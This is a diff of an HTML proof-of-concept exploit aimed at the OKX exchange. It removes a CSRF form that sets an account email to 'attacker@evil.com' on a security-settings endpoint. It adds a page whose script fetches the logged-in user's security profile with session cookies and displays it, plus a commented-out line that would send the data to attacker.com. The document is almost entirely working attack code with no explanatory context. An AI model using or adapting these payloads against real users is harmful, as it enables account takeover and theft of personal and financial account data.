@@ -1,5 +1,28 @@
-<form action="https://www.okx.com/v3/users/security/settings/update" method="POST">
-    <input type="hidden" name="email" value="attacker@evil.com">
-    <input type="submit" value="Exploit">
-  </form>
-  
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OKX CORS Exploit PoC</title>
+</head>
+<body>
+  <h1>User Info from OKX:</h1>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    fetch("https://www.okx.com/v3/users/security/profile?t=" + Date.now(), {
+      method: "GET",
+      credentials: "include" // include session cookies
+    })
+    .then(response => response.json())
+    .then(data => {
+      // Show data on page
+      document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+
+      // Optional: Exfiltrate to attacker's server
+      // fetch("https://attacker.com/collect?data=" + btoa(JSON.stringify(data)));
+    })
+    .catch(err => {
+      document.getElementById("output").innerText = "Request failed: " + err;
+    });
+  </script>
+</body>
+</html>
